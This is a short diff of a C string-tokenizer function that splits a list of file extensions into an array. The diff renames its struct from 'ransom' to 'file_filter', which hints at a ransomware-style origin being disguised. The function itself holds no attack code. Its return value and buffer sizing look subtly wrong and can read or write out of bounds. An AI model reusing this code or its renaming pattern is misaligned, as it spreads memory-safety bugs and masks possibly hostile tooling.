@@ -2,21 +2,21 @@
 /**
   * tokenizer - create an array of strings
   * @str: string to tokenize
-  * @ransom: ransom struct to push stuff into
+  * @file_filter: file_filter struct to push stuff into
   * Return: pointer to first token.
  **/
-char *tokenizer(char *str, ransom_t *ransom)
+char *tokenizer(char *str, file_filter_t *file_filter)
 {
 	unsigned int len, count_delims, i;
 	char *saveptr, *token, **tokens;
 	char *str_copied;
 
 	len = count_delims = 0;
-	if (!ransom)
+	if (!file_filter)
 		return (NULL);
 	if (!str)
 	{
-		ransom->file_extensions = NULL;
+		file_filter->file_extensions = NULL;
 		return (NULL);
 	}
 	/* count chars in string while counting delims */
@@ -24,7 +24,7 @@ char *tokenizer(char *str, ransom_t *ransom)
 		if (str[len] == ' ')
 			count_delims++;
 	str_copied = my_calloc((len + 1) * sizeof(char), sizeof(char));
-	ransom->file_exts_whole_str = my_strncat(str_copied, str, 0, len);
+	file_filter->file_exts_whole_str = my_strncat(str_copied, str, 0, len);
 	tokens = malloc((count_delims + 2) * sizeof(char *));
 	tokens[0] = token = my_strtok_r(str_copied, "\n ", &saveptr);
 	for (i = 1; token != NULL; i++)
@@ -32,7 +32,7 @@ char *tokenizer(char *str, ransom_t *ransom)
 		token = my_strtok_r(NULL, "\n ", &saveptr);
 		tokens[i] = token;
 	}
-	ransom->file_extensions = tokens;
+	file_filter->file_extensions = tokens;
 	return (tokens[i]);
 }
 
